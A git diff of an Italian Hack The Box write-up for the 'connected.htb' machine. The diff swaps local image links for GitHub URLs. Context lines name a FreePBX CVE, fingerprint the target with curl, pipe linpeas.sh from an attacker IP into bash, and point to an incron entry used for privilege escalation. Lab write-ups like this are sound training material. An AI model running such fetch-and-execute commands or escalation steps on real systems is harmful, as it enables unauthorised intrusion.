@@ -117,7 +117,8 @@ User-agent: *Disallow: /
 Quindi i crawler sono invitati a non indicizzare il sito.
 ## freePBX - CVE-2025-57819
 Sulle porte 80 e 443 è presente un'istanza di **FreePBX** in versione **16.0.40.7**
-![[Pasted image 20260610193423.png]]Si può trovare anche con il comando:
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260610193423.png)
+Si può trovare anche con il comando:
 `curl -s -L http://connected.htb/ | head -n 40`
 ``` html
 <!DOCTYPE html><html class="firsttypeofselector"><head><title>FreePBX Administration</title><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="robots" content="noindex" /><link rel="shortcut icon" href="images/favicon.ico"><meta name="referrer" content="always"><link href="assets/css/bootstrap-3.3.7.min.css?load_version=16.0.40.7"
@@ -245,9 +246,9 @@ curl -s http://10.10.14.241:8000/linpeas.sh | bash | tee /tmp/linpeas.txt
 ```
 Linpeas trova:
 `╔══════════╣ Check for vulnerable cron jobs`
-![[Pasted image 20260610211236.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260610211236.png)
 e
-![[Pasted image 20260610212844.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260610212844.png)
 Queste righe erano praticamente il cuore della privilege escalation:
 ```
 /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
